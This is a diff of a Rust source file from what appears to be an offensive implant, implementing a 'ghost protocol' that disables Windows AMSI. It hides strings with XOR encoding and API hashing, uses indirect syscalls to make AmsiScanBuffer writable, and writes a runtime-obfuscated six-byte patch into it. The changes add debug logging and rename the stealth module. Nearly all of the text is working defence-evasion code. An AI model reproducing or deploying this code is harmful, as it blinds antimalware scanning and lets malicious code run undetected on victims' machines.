@@ -7,8 +7,8 @@
 //! - OpSec: No String Artifacts (Error Codes only)
 //! - Safety: 6-byte patch (Safe Instruction Boundary)
 
-use crate::stealth::windows::api_resolver::{self, djb2};
-use crate::stealth::windows::syscalls::{self, Syscall};
+use crate::s::windows::api_resolver::{self, djb2};
+use crate::s::windows::syscalls::{self, Syscall};
 use std::ffi::c_void;
 use std::ptr;
 
@@ -28,10 +28,13 @@ const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
 #[cfg(target_arch = "x86_64")]
 pub fn apply_ghost_protocol() {
+    crate::k::debug::log_op!("GhostProtocol", "Initializing...");
+
     #[cfg(debug_assertions)]
     info!("GP Init");
 
     if let Err(_c) = unsafe { execute_bypass() } {
+        crate::k::debug::log_err!(format!("GP Fail Code: {}", _c));
         #[cfg(debug_assertions)]
         warn!("GP Fail: {}", _c);
     } else {
@@ -61,18 +64,39 @@ unsafe fn execute_bypass() -> Result<(), u32> {
     // 5: Flush Failed
 
     // 0. Resolve NtFlushInstructionCache via indirect syscall
+    crate::k::debug::log_detail!("Resolving NtFlushInstructionCache...");
     let sc_flush = Syscall::resolve(syscalls::HASH_NT_FLUSH_INSTRUCTION_CACHE).ok_or(3u32)?;
 
-    // 1. Target amsi.dll - precomputed hash (no string in binary)
-    // djb2(b"amsi.dll") = 0x614B4D45
-    const HASH_AMSI: u32 = 0x614B4D45;
-    let amsi_base = api_resolver::get_module_by_hash(HASH_AMSI).ok_or(1u32)?;
+    // FIX: Ensure amsi.dll is loaded
+    // 1. Target amsi.dll
+    // Use the handle we just got/ensured
+    let mut amsi_base = ptr::null();
+    unsafe {
+        type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
+        if let Some(load_lib_ptr) = api_resolver::resolve_api::<LoadLibraryA>(api_resolver::HASH_KERNEL32, api_resolver::HASH_LOAD_LIBRARY_A) {
+             let load_lib: LoadLibraryA = std::mem::transmute(load_lib_ptr);
+             let amsi_enc = [0x34, 0x38, 0x26, 0x3c, 0x7b, 0x31, 0x39, 0x39, 0x55]; 
+             let amsi_str: Vec<u8> = amsi_enc.iter().map(|b| b ^ 0x55).collect();
+             amsi_base = load_lib(amsi_str.as_ptr());
+             crate::k::debug::log_detail!("Ensured amsi.dll loaded: {:p}", amsi_base);
+        }
+    }
+    
+    if amsi_base.is_null() {
+        // Fallback to hash lookup if load failed (unlikely)
+        const HASH_AMSI: u32 = 0x614B4D45;
+        amsi_base = api_resolver::get_module_by_hash(HASH_AMSI).ok_or(1u32)?;
+    }
 
-    // 2. Target AmsiScanBuffer - precomputed hash (no string in binary)
-    // djb2(b"AmsiScanBuffer") = 0x7D5C5C7D (precomputed at build time)
-    const HASH_AMSI_SCAN_BUFFER: u32 = 0x7D5C5C7D;
-    let target_func = api_resolver::get_export_by_hash(amsi_base, HASH_AMSI_SCAN_BUFFER).ok_or(2u32)?;
+    // 2. Target AmsiScanBuffer - using decrypted string to ensure accuracy
+    // "AmsiScanBuffer" XOR 0x55
+    let func_enc = [0x14, 0x38, 0x26, 0x3C, 0x06, 0x36, 0x34, 0x3B, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27];
+    let func_vec: Vec<u8> = func_enc.iter().map(|b| b ^ 0x55).collect();
+    let func_str = std::str::from_utf8(&func_vec).unwrap_or("AmsiScanBuffer");
+    
+    let target_func = api_resolver::get_export_by_name(amsi_base, func_str).ok_or(2u32)?;
     let target_addr = target_func as usize;
+    crate::k::debug::log_detail!("Found AmsiScanBuffer: 0x{:x}", target_addr);
 
     // 3. Polymorphic Patch (6 bytes) - Runtime generated
     // Original: mov eax, 0x80070057; ret (static signature)
@@ -101,12 +125,19 @@ unsafe fn execute_bypass() -> Result<(), u32> {
     for b in patch_bytes.iter_mut() {
         *b ^= xor_key;
     }
+    for b in patch_bytes.iter_mut() {
+        *b ^= xor_key;
+    }
+    
+    crate::k::debug::log_hex!("Patch Bytes (XOR'd)", patch_bytes);
+
     // De-XOR right before use (same memory, but defeats static analysis)
     for b in patch_bytes.iter_mut() {
         *b ^= xor_key;
     }
 
     // 4. Resolve Protect Syscall
+    crate::k::debug::log_detail!("Resolving NtProtectVirtualMemory...");
     let sc_protect = Syscall::resolve(syscalls::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or(3u32)?;
     
     let mut base_addr = target_func as *mut c_void;
@@ -167,6 +198,12 @@ unsafe fn execute_bypass() -> Result<(), u32> {
         PAGE_EXECUTE_READWRITE as usize,
         &mut old_protect as *mut _ as usize
     ]);
+    
+    if status == 0 {
+        crate::k::debug::log_detail!("RWX Unlock Success. Writing Patch...");
+    } else {
+        crate::k::debug::log_err!(format!("RWX Unlock Fail: Status 0x{:x}", status));
+    }
 
     // Update flag based on success
     if status == 0 {
@@ -184,6 +221,7 @@ unsafe fn execute_bypass() -> Result<(), u32> {
         let mut region_size2 = patch_bytes.len();
         let mut temp: u32 = 0;
         
+        crate::k::debug::log_detail!("Restoring Permissions (RX)...");
         syscalls::syscall(&sc_protect, &[
             -1 as isize as usize,
             &mut base_addr as *mut _ as usize,
@@ -191,6 +229,7 @@ unsafe fn execute_bypass() -> Result<(), u32> {
             old_protect as usize,
             &mut temp as *mut _ as usize
         ]);
+        crate::k::debug::log_detail!("Ghost Protocol Complete.");
     }
 
     let _ = worker.join(); // Cleanup
